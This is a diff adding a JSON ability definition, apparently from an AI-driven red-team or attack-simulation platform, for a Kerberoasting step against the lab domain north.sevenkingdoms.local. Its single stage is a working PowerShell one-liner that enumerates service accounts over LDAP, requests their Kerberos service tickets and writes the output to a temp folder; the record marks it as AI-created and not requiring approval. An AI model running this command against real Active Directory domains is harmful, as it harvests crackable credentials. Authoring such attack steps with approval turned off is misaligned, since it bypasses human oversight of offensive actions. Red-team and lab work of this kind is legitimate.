@@ -1,0 +1,34 @@
+{
+  "ability_id": "476e45d3-690b-496f-bf69-725bae29380a",
+  "skill": "accessing-credentials",
+  "saved_at": "2026-06-25T07:46:35.375278+00:00",
+  "ability": {
+    "name": "Native PowerShell Kerberoasting",
+    "description": "Performs native Kerberoasting using .NET KerberosRequestorSecurityToken to request tickets for Active Directory service accounts on north.sevenkingdoms.local.",
+    "mitre_tactic": "credential-access",
+    "mitre_technique_id": "T1558.003",
+    "platform": "windows",
+    "impact_type": "credential-harvesting",
+    "default_severity": "medium",
+    "requires_approval": false,
+    "tags": [
+      "kerberoast",
+      "tgs-req"
+    ],
+    "created_by": "ai",
+    "engagement_id": "e70e34e075264e7c97c2156a69c0574b"
+  },
+  "stages": [
+    {
+      "stage_name": "native-kerberoast",
+      "stage_order": 1,
+      "executor": "powershell",
+      "command_template": "$d='C:\\Windows\\Temp\\bas'; if(!(Test-Path \"$d\\cred_access\")){ni -ItemType Directory -Force \"$d\\cred_access\"|out-null}; $(try { Add-Type -AssemblyName System.IdentityModel; $spns = @(); try { $searcher = [ADSISearcher]\"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\"; $searcher.SearchRoot = [ADSI]\"LDAP://192.168.127.11/DC=north,DC=sevenkingdoms,DC=local\"; foreach($result in $searcher.FindAll()) { foreach($spn in $result.Properties.serviceprincipalname) { if($spn -notmatch \"krbtgt\") { $spns += $spn } } } } catch { Write-Output \"LDAP search failed: $_. Reverting to fallback SPN list.\"; $spns = @(\"MSSQLSvc/sql01.north.sevenkingdoms.local:1433\", \"HTTP/web01.north.sevenkingdoms.local\") }; foreach($spn in $spns) { try { $tgt = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; Write-Output \"Successfully requested TGS for $spn\" } catch { Write-Output \"Failed for $spn: $_\" } } } catch { \"ERROR: $_\" }) | Tee-Object -FilePath \"$d\\cred_access\\kerberoast_out.txt\"",
+      "timeout_seconds": 120,
+      "payload_id": null
+    }
+  ],
+  "rationale": "Queries Active Directory and natively requests ticket-granting service (TGS) tickets for service accounts, saving output to a dedicated file without raw redirection conflicts.",
+  "provider": "lead-red-teamer",
+  "cited_urls": []
+}
